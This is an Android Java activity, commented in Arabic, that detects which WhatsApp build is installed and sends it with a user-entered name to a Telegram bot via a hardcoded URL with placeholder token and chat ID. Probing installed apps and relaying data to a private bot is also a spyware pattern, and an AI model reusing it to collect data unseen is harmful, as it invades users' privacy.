package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import okhttp3.*;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private EditText nameInput, packageField;
    private String botToken = "رقم_البوت_هنا";
    private String chatId = "رقم_الشات_هنا";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // فحص الحالة: إذا كان مرسل الطلب الأول اذهب للصفحة 2
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        if (pref.getInt("current_step", 0) == 1) {
            startActivity(new Intent(this, SecondActivity.class));
            finish();
        }

        setContentView(R.layout.activity_main);

        nameInput = findViewById(R.id.nameInput);
        packageField = findViewById(R.id.packageField);
        Button sendBtn = findViewById(R.id.sendBtn);

        // جلب الحزمة تلقائياً
        packageField.setText(getInstalledPackage());

        sendBtn.setOnClickListener(v -> sendToTelegram());
    }

    private String getInstalledPackage() {
        String[] apps = {"com.abwhatsapp", "com.gbwhatsapp", "com.whatsapp"};
        for (String pkg : apps) {
            try {
                getPackageManager().getPackageInfo(pkg, 0);
                return pkg;
            } catch (Exception e) {}
        }
        return "Not Found";
    }

    private void sendToTelegram() {
        String msg = "👤 الاسم: " + nameInput.getText().toString() + "\n📱 الحزمة: " + packageField.getText().toString();
        
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + msg)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().putInt("current_step", 1).apply();
                    startActivity(new Intent(MainActivity.this, SecondActivity.class));
                    finish();
                }
            }
        });
    }
}
